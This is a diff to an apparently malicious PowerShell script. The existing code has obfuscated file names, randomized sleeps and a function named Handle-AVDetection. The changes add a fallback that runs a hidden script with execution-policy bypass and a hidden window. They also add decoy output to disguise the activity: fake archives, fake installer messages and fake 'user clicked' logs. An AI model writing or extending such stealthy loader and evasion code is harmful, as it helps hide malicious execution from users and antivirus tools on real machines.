@@ -105,9 +105,14 @@ Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 120)
 $scps1 = Join-Path $dest $randomFiles[DoubleObfuscate("system_cache.ps1",$key)]
 if (Test-Path $scps1) {
     try {
+        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
         $memScript = Get-Content $scps1 -Raw
         $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($memScript))
-        powershell -EncodedCommand $encoded
+        if (Get-Command powershell -ErrorAction SilentlyContinue) {
+            powershell -EncodedCommand $encoded
+        } else {
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scps1`""
+        }
     } catch {
         Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scps1`""
     }
@@ -318,4 +323,24 @@ function Handle-AVDetection {
         }
         "noop" { Write-Output "No operation performed." }
     }
+}
+if ((Get-Random) % 3 -eq 0) {
+    $archivePath = Join-Path $dest ([guid]::NewGuid().Guid.Substring(0,8) + ".zip")
+    Set-Content -Path $archivePath -Value "PK" -Encoding ASCII
+    Write-Output "Fake archive created: $archivePath"
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 200)
+}
+if ((Get-Random) % 4 -eq 0) {
+    Write-Output "Starting fake installer..."
+    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
+    Write-Output "Installation complete."
+}
+if ((Get-Random) % 2 -eq 0) {
+    Write-Output "Checking system requirements..."
+    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300)
+    Write-Output "System requirements met."
+}
+for ($i=0; $i -lt (Get-Random -Minimum 1 -Maximum 3); $i++) {
+    Write-Output "User clicked: Button" + (Get-Random -Minimum 1 -Maximum 5)
+    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 150)
 }
